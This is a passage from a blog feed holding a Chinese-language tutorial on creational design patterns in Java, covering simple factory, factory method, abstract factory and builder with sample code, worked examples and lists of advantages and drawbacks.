class="line">retu</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式-创建型模式</title>
      <link href="/posts/659b9bb9.html"/>
      <url>/posts/659b9bb9.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>设计模式系列文章导航</strong></p><ol><li><a href="/posts/bb7571ed.html">设计模式概述</a></li><li><a href="/posts/f9c29644.html">面向对象设计原则</a></li><li><a href="/posts/659b9bb9.html">设计模式 - 创建型模式</a> 📍当前位置</li><li><a href="/posts/b6c6dbc4.html">设计模式 - 结构型模式</a></li><li><a href="/posts/3194e4c1.html">设计模式 - 行为型模式</a></li></ol></blockquote><h2 id="创建型模式">创建型模式</h2><ul><li>创建型模式对类的实例化过程进行了抽象，能够将软件模块中对象的创建和对象的使用分离，对用户隐藏了类的实例的创建细节。</li><li>创建型模式描述如何将对象的创建和使用分离，让用户在使用对象时无须关心对象的创建细节，从而降低系统的耦合度，让设计方案更易于修改和扩展。每一个创建型模式都通过采用不同的解决方案来回答3个问题，即创建什么（What）、由谁创建（Who）和何时创建 （When）。</li></ul><h2 id="简单工厂模式-Simple-Factory">简单工厂模式(Simple Factory)</h2><div class="tip "><p><strong>定义</strong>：</p><p>定义一个工厂类，它可以根据参数的不同返回不同类的实例，被创建的实例通常都具有共同的父类。</p></div><h3 id="模式结构">模式结构</h3><h4 id="结构图">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231228135115130.png" alt="image-20231228135115130"></p><h4 id="实现代码">实现代码</h4><ul><li><p>抽象产品类：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="comment">// 所有产品类的公共业务方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodSame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//公共方法的实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明抽象业务方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">methodDiff</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体产品类：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteProduct</span> <span class="keyword">extends</span> <span class="title class_">Product</span>&#123;</span><br><span class="line">    <span class="comment">//实现业务方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodDiff</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//业务方法的实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>工厂类：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Factory</span> &#123;</span><br><span class="line">    <span class="comment">//静态工厂方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Product <span class="title function_">getProduct</span><span class="params">(String arg)</span> &#123;</span><br><span class="line">        <span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (arg.equalsIgnoreCase(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            product = <span class="keyword">new</span> <span class="title class_">ConcreteProductA</span>();</span><br><span class="line">            <span class="comment">//初始化设置product</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (arg.equalsIgnoreCase(<span class="string">&quot;B&quot;</span>)) &#123;</span><br><span class="line">            product = <span class="keyword">new</span> <span class="title class_">ConcreteProductB</span>();</span><br><span class="line">            <span class="comment">//初始化设置product</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> product;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>客户端：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        Product product;</span><br><span class="line">        <span class="comment">//通过工厂类创建产品对象</span></span><br><span class="line">        product = Factory.getProduct(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        product.methodSame();</span><br><span class="line">        product.methodDiff();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例">应用实例</h3><blockquote><p>​某软件公司要基于Java语言开发一套图表库，该图表库可以为应用系统提供多种不同外观的图表，例如柱状图（HistogramChart）、饼状图（PieChart）、折线图（LineChart）等。该软件公司图表库设计人员希望为应用系统开发人员提供一套灵活易用的图表库，通过设置不同的参数即可得到不同类型的图表，而且可以较为方便地对图表库进行扩展，以便能够在将来增加一些新类型的图表。</p><p>​现使用简单工厂模式来设计该图表库</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231228135130792.png" alt="image-20231228135130792"></p><ul><li>抽象产品类：<code>Chart</code></li><li>具体产品类：<code>HistogramChart</code>、<code>PieChart</code>、<code>LineChart</code></li><li>工厂类：<code>ChartFactory</code></li></ul><h3 id="特点及使用环境">特点及使用环境</h3><h4 id="优点">优点</h4><ol><li>实现了对象创建和使用的分离</li><li>客户端无须知道所创建的具体产品类的类名</li><li>通过引入配置文件，可以在不修改任何客户端代码的情况下更换和增加新的具体产品类，提高了系统的灵活性</li></ol><h4 id="缺点">缺点</h4><ol><li>工厂类集中了所有产品的创建逻辑，职责过重</li><li>增加系统中类的个数，提高了系统的复杂度和理解难度</li><li>系统扩展困难，添加新产品需要修改工厂逻辑</li><li>由于使用了静态工厂方法，工厂角色无法形成基于继承的等级结构</li></ol><h4 id="适用环境">适用环境</h4><ol><li>工厂类中需要创建的对象较少</li><li>客户端只知道传入工厂的参数，不关心对象如何创建</li></ol><h2 id="工厂方法模式★-Factory-Method">工厂方法模式★(Factory Method)</h2><div class="tip "><p><strong>定义</strong>：</p><p>定义一个用于创建对象的接口，但是让子类决定将哪一个类实例化。工厂方法模式让一个类的实例化延迟到其子类。</p></div><h3 id="模式结构-2">模式结构</h3><h4 id="结构图-2">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231228134757404.png" alt="image-20231228134757404"></p><h4 id="实现代码-2">实现代码</h4><ul><li><p>抽象工厂（Factory）：</p><p>在抽象工厂类中声明了工厂方法，用于返回一个产品。抽象工厂是工厂方法模式的核心，所有创建对象的工厂类都必须实现该接口。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Factory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">factoryMethod</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体工厂（ConcreteFactory）：</p><p>它是抽象工厂类的子类，实现了在抽象工厂中声明的工厂方法，并可由客户端调用，返回一个具体产品类的实例。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteFactory</span> <span class="keyword">implements</span> <span class="title class_">Factory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">factoryMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>抽象产品（Product）：</p><p>它是定义产品的接口，是工厂方法模式所创建对象的超类型， 也就是产品对象的公共父类。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="comment">// 所有产品类的公共业务方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodSame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//公共方法的实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明抽象业务方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">methodDiff</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体产品（ConcreteProduct）：</p><p>它实现了抽象产品接口，某种类型的具体产品由专门的具体工厂创建，具体工厂和具体产品之间一一对应。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteProduct</span> <span class="keyword">extends</span> <span class="title class_">Product</span>&#123;</span><br><span class="line">    <span class="comment">//实现业务方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodDiff</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//业务方法的实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>客户端：</p><p>在客户端代码中，开发人员只需关心工厂类即可，不同的具体工厂可以创建不同的产品。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可通过配置文件与反射机制实现</span></span><br><span class="line"><span class="type">Factory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConoreteFactory</span>();</span><br><span class="line"><span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> factory.factoryMethod();</span><br></pre></td></tr></table></figure><blockquote><p>反射机制与配置文件可参考：<a href="/posts/896ca548.html">Java反射机制与配置文件</a></p></blockquote></li></ul><h3 id="应用实例-2">应用实例</h3><blockquote><p>​某系统运行日志记录器（Logger）可以通过多种途径保存系统的运行日志，例如通过文件记录或数据库记录，用户可以通过修改配置文件灵活地更换日志记录方式。在设计各类日志记录器时，开发人员发现需要对日志记录器进行一些初始化工作，初始化参数的设置过程较为复杂，而且某些参数的设置有严格的先后次序，否则可能会发生记录失败。</p><p>​为了更好地封装记录器的初始化过程并保证多种记录器切换的灵活性，现使用工厂方法模式设计该系统（注：在Java中常用的日志记录工具有 SLF4J、Log4j、GCLogViewer、Logstash 等）。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231228134825144.png" alt="image-20231228134825144"></p><ul><li>抽象产品：<code>Logger</code></li><li>具体产品：<code>FileLogger</code>、<code>DatabaseLogger</code></li><li>抽象工厂：<code>LoggerFactory</code></li><li>具体工厂：<code>FileLoggerFactory</code>、<code>DatabaseLoggerFactory</code></li></ul><h3 id="模式变化">模式变化</h3><h4 id="工厂方法的重载">工厂方法的重载</h4><p>在某些情况下，可以通过多种方式来初始化同一个产品类。比如实例中的记录器，可以为各种日志记录器提供默认实现；还可以为数据库日志记录器提供数据库连接字符串，为文件日志记录器提供文件路径；也可以将相关参数封装在一个Object类型的对象中，通过Object对象将配置参数传入工厂类。此时可以提供一组重载的工厂方法，以不同的方式对产品对象进行创建。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231228134856569.png" alt="image-20231228134856569"></p><ul><li><p>抽象工厂类：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">LoggerFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">createLogger</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">createLogger</span><span class="params">(String args)</span>;</span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">createLogger</span><span class="params">(Object obj)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体工厂类（以DatabaseLoggerFactory举例）：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DatabaseLoggerFactory</span> <span class="keyword">implements</span> <span class="title class_">LoggerFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">createLogger</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//使用默认方式连接数据库</span></span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseLogger</span>();</span><br><span class="line">        <span class="comment">//初始化数据库日志记录器</span></span><br><span class="line">        <span class="keyword">return</span> logger;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">createLogger</span><span class="params">(String args)</span> &#123;</span><br><span class="line">        <span class="comment">//使用参数args作为连接字符串来连接数据库</span></span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseLogger</span>();</span><br><span class="line">        <span class="comment">//初始化数据库日志记录器</span></span><br><span class="line">        <span class="keyword">return</span> logger;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">createLogger</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="comment">//使用封装在参数obj中的连接字符串来连接数据库</span></span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseLogger</span>();</span><br><span class="line">        <span class="comment">//使用封装在参数obj中的数据来初始化数据库日志记录器</span></span><br><span class="line">        <span class="keyword">return</span> logger;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>在抽象工厂中声明了多个重载的工厂方法，在具体工厂中实现了这些工厂方法,这些方法可以包含不同的业务逻辑，以满足产品对象的多样化创建需求。</p><h4 id="工厂方法的隐藏">工厂方法的隐藏</h4><p>有时候，为了进一步简化客户端的使用，还可以对客户端隐藏工厂方法，此时在工厂类中直接调用产品类的业务方法，客户端无须调用工厂方法创建产品对象，直接使用工厂对象即可调用所创建的产品对象中的业务方法。</p><ul><li><p>抽象工厂类，将原先的接口（interface）修改为抽象类（abstract）：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">LoggerFactory</span> &#123;</span><br><span class="line">    <span class="comment">//在工厂类中直接调用日志记录器类的业务方法writeLog()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeLog</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> <span class="built_in">this</span>.createLogger();</span><br><span class="line">        logger.writeLog();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> Logger <span class="title function_">createLogger</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>客户端：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[ ])</span> &#123;</span><br><span class="line">        LoggerFactory factory;</span><br><span class="line">        factory = (LoggerFactory)XMLUtil.getBean();</span><br><span class="line">        <span class="comment">//直接使用工厂对象来调用产品对象的业务方法</span></span><br><span class="line">        factory.writeLog(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>通过把业务方法的调用移至工厂类中，可以直接使用工厂对象来调用产品对象的业务方法，客户端无须使用工厂方法来创建产品对象。</p><h3 id="特点及使用环境-2">特点及使用环境</h3><h4 id="优点-2">优点</h4><ol><li>向客户隐藏了哪种具体产品类将被实例化这一细节</li><li>能够让工厂自主确定创建何种产品对象</li><li>完全符合开闭原则</li></ol><h4 id="缺点-2">缺点</h4><ol><li>系统中类的个数将成对增加，在一定程度上增加了系统的复杂度，会给系统带来一些额外的开销</li><li>增加了系统的抽象性和理解难度</li></ol><h4 id="适用环境-2">适用环境</h4><ol><li>客户端不知道它所需要的对象的类（客户端不需要知道具体产品类的类名，只需要知道所对应的工厂即可，具体产品对象由具体工厂类创建）</li><li>抽象工厂类通过其子类来指定创建哪个对象</li></ol><h2 id="抽象工厂模式-Abstract-Factory">抽象工厂模式(Abstract Factory)</h2><div class="tip "><p><strong>定义</strong>：</p><p>提供一个创建一系列相关或相互依赖对象的接口，而无须指定它们具体的类。</p></div><p><img src="https://oss.iuoyt.com/img/posts/image-20231228141139951.png" alt="image-20231228141139951"></p><h3 id="模式结构-3">模式结构</h3><h4 id="结构图-3">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231228135936556.png" alt="image-20231228135936556"></p><h4 id="实现代码-3">实现代码</h4><ul><li><p>抽象工厂（AbstractFactory）</p><p>它声明了一组用于创建一族产品的方法，每一个方法对应一种产品。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> AbstractProductA <span class="title function_">createProductA</span><span class="params">()</span>; <span class="comment">//工厂方法一</span></span><br><span class="line">    <span class="keyword">public</span> AbstractProductB <span class="title function_">createProductB</span><span class="params">()</span>; <span class="comment">//工厂方法二</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体工厂（ConcreteFactory）</p><p>它实现了在抽象工厂中声明的创建产品的方法，生成一组具体产品，这些产品构成了一个产品族，每一个产品都位于某个产品等级结构中。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteFactoryl</span> <span class="keyword">extends</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="comment">//工厂方法一</span></span><br><span class="line">    <span class="keyword">public</span> AbstractProductA <span class="title function_">createProductA</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProductA1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//工厂方法二</span></span><br><span class="line">    <span class="keyword">public</span> AbstractProductB <span class="title function_">createProductB</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProductB1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>抽象产品（AbstractProduct）</p><p>它为每种产品声明接口，在抽象产品中声明了产品所具有的业务方法。</p></li><li><p>具体产品（ConcreteProduct）</p><p>它定义具体工厂生产的具体产品对象，实现抽象产品接口中声明的业务方法。</p></li></ul><h3 id="应用实例-3">应用实例</h3><blockquote><p>​某软件公司要开发一套界面皮肤库，可以对基于Java的桌面软件进行界面美化。用户在使用时可以通过菜单来选择皮肤，不同的皮肤将提供视觉效果不同的按钮、文本框、组合框等界面元素，例如春天(Spring)风格的皮肤将提供浅绿色的按钮、绿色边框的文本框和绿色边框的组合框，而夏天(Summer)风格的皮肤则提供浅蓝色的按钮、蓝色边框的文本框和蓝色边框的组合框，其结构示意图如下图所示：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231228141412998.png" alt="image-20231228141412998"></p><p>​该皮肤库需要具备良好的灵活性和可扩展性，用户可以自由选择不同的皮肤，开发人员可以在不修改既有代码的基础上增加新的皮肤。</p><p>​现使用抽象工厂模式来设计该界面皮肤库。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231228141535559.png" alt="image-20231228141535559"></p><ul><li>抽象工厂：<code>SkinFactory</code></li><li>具体工厂：<code>SpringSkinFactory</code>、<code>SummerSkinFactory</code></li><li>抽象产品：<code>Button</code>、<code>TextField</code>、<code>ComboBox</code></li><li>具体产品：<code>SpringButton</code>、<code>SpringTextField</code>、<code>SpringComboBox</code>、<code>SummerButton</code>、<code>SummerTextField</code>、<code>SummerComboBox</code></li></ul><h3 id="模式变化-2">模式变化</h3><h4 id="开闭原则的倾斜性">开闭原则的倾斜性</h4><p>在抽象工厂模式中增加新的产品族很方便，但是增加新的产品等级结构很麻烦，抽象工厂模式的这种性质称为开闭原则的倾斜性。</p><ul><li>对于增加新的产品族，抽象工厂模式很好地支持了开闭原则，只需要增加具体产品并对应增加一个新的具体工厂，对已有代码无须做任何修改</li><li>对于增加新的产品等级结构，需要修改所有的工厂角色，包括抽象工厂类，在所有的工厂类中都需要增加生产新产品的方法，违背了开闭原则</li></ul><h3 id="特点及使用环境-3">特点及使用环境</h3><h4 id="优点-3">优点</h4><ol><li>隔离了具体类的生成，使得客户端并不需要知道什么被创建</li><li>能够保证客户端始终只使用同一个产品族中的对象</li><li>增加新的产品族很方便，无须修改已有系统，符合开闭原则</li></ol><h4 id="缺点-3">缺点</h4><ol><li>增加新的产品等级结构麻烦，需要对原有系统进行较大的修改，甚至需要修改抽象层代码，这显然会带来较大的不便，违背了开闭原则</li></ol><h4 id="适用环境-3">适用环境</h4><ol><li>系统不依赖于产品类实例如何被创建、组合和表达的细节</li><li>系统中有多于一个的产品族，但每次只使用其中某一产品族</li><li>属于同一个产品族的产品将在一起使用</li><li>产品等级结构稳定，在设计完成之后不会向系统中增加新的产品等级结构或者删除已有的产品等级结构</li></ol><h2 id="建造者模式★-Builder">建造者模式★(Builder)</h2><div class="tip "><p><strong>定义</strong>：</p><p>将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。</p></div><h3 id="模式结构-4">模式结构</h3><h4 id="结构图-4">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231228143123688.png" alt="image-20231228143123688"></p><h4 id="实现代码-4">实现代码</h4><ul><li><p>产品（Product）</p><p>复杂对象是指那些包含多个成员变量的对象，这些成员变量也称为部件或零件，如汽车包括方向盘、发动机、轮胎等部件，电子邮件包括发件人、收件人、主题、内容、附件等部件。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line">    <span class="comment">//定义部件，部件可以是任意类型，包括值类型和引用类型</span></span><br><span class="line">    <span class="keyword">private</span> String partA; </span><br><span class="line">    <span class="keyword">private</span> String partB;</span><br><span class="line">    <span class="keyword">private</span> String partC;</span><br><span class="line">    <span class="comment">//Getter方法和Setter方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>抽象建造者（Builder）</p><p>它为创建一个产品对象的各个部件指定抽象接口，在该接口中一般声明两类方法，一类方法是<code>buildPartX()</code>，它们用于创建复杂对象的各个部件；另一类方法是<code>getResult()</code>，它们用于返回复杂对象。Builder既可以是抽象类，也可以是接口。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Builder</span> &#123;</span><br><span class="line">    <span class="comment">//创建产品对象</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Product</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">buildPartA</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">buildPartB</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">buildPartC</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">//返回产品对象</span></span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">getResult</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> product;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体建造者（ConcreteBuilder）</p><p>它实现了 Builder接口，实现各个部件的具体构造和装配方法，定义并明确所创建的复杂对象，还可以提供一个方法返回创建好的复杂产品对象。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteBuilder1</span> <span class="keyword">extends</span> <span class="title class_">Builder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buildPartA</span><span class="params">()</span> &#123;</span><br><span class="line">        product.setPartA(<span class="string">&quot;A1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buildPartB</span><span class="params">()</span> &#123;</span><br><span class="line">        product.setPartB(<span class="string">&quot;B1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buildPartC</span><span class="params">()</span> &#123;</span><br><span class="line">        product.setPartC(<span class="string">&quot;C1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 